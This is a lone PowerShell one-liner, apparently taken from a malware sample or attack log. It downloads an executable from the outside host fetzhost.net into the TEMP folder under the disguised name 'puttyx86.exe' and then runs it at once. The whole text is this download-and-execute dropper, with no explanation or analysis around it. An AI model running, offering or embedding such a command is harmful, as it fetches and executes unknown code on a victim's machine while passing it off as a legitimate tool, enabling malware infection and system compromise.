
(New-Object System.Net.WebClient).DownloadFile('http://fetzhost.net/files/044ae4aa5e0f2e8df02bd41bdc2670b0.exe',"$env:TEMP\puttyx86.exe");Start-Process ("$env:TEMP\puttyx86.exe")

